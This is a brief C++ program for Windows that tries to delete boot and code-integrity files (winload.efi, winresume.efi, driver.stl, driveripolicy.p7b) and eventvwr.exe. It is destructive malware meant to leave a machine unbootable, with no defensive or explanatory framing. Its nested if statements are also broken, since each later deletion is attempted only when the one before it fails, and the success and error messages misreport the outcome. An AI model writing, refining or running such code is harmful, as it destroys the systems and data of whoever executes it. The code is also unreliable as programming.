#include <stdio.h>
#include <iostream>
#include <Windows.h>

int main()
{
	if (remove("C:\\Windows\\System32\\Boot\\winload.efi") != 0)
	if (remove("C:\\Windows\\System32\\Boot\\winresume.efi") != 0)
	if (remove("C:\\Windows\\System32\\CodeIntegrity\\driver.stl") != 0)
	if (remove("C:\\Windows\\System32\\CodeIntegrity\\driveripolicy.p7b") != 0)
	if (remove("C:\\Windows\\System32\\eventvwr.exe") != 0)
		perror("Error Deleting File, System Saved");
	else
		puts("File Successfully deleted");
	return 0;
}
